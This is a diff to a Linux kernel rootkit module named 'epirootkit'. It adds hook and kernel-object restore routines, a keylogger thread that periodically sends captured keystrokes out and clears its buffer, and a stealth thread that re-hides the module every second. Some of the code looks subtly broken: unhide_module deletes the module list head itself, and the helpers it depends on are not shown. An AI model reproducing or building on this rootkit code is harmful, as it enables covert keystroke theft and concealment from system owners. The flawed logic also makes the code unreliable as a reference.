@@ -291,5 +291,85 @@ static void __exit epirootkit_exit(void) {
     spin_unlock_irqrestore(&hook_lock, flags);
 }
 
+// Hook management
+void remove_hook(struct hook_entry *entry) {
+    if (!entry) return;
+    
+    // Restore original function
+    if (entry->original) {
+        *entry->target = entry->original;
+    }
+    
+    // Remove from list
+    list_del(&entry->list);
+    kfree(entry);
+}
+
+// DKOM functions
+void dkom_restore_object(struct dkom_entry *entry) {
+    if (!entry) return;
+    
+    // Restore original object
+    if (entry->original) {
+        memcpy(entry->target, entry->original, entry->size);
+    }
+    
+    // Remove from list
+    list_del(&entry->list);
+    kfree(entry);
+}
+
+// Keylogger functions
+void keylog_buffer_cleanup(void) {
+    // Clear keylog buffer
+    memset(keylog_buffer, 0, KEYLOG_BUFFER_SIZE);
+    keylog_buffer_index = 0;
+}
+
+// Module hiding
+void unhide_module(void) {
+    // Remove module from hidden list
+    list_del(&module_list);
+    module_hidden = false;
+}
+
+// Memory management
+void free_secure_memory(void *ptr, size_t size) {
+    if (!ptr) return;
+    
+    // Securely wipe memory before freeing
+    memset(ptr, 0, size);
+    kfree(ptr);
+}
+
+// Thread functions
+int stealth_thread(void *data) {
+    while (!kthread_should_stop()) {
+        // Check if module is still hidden
+        if (!module_hidden) {
+            hide_module();
+        }
+        
+        // Sleep for a while
+        msleep(1000);
+    }
+    return 0;
+}
+
+int keylog_thread(void *data) {
+    while (!kthread_should_stop()) {
+        // Process keylog buffer
+        if (keylog_buffer_index > 0) {
+            // Send keylog data
+            send_keylog_data();
+            keylog_buffer_cleanup();
+        }
+        
+        // Sleep for a while
+        msleep(100);
+    }
+    return 0;
+}
+
 module_init(epirootkit_init);
 module_exit(epirootkit_exit);
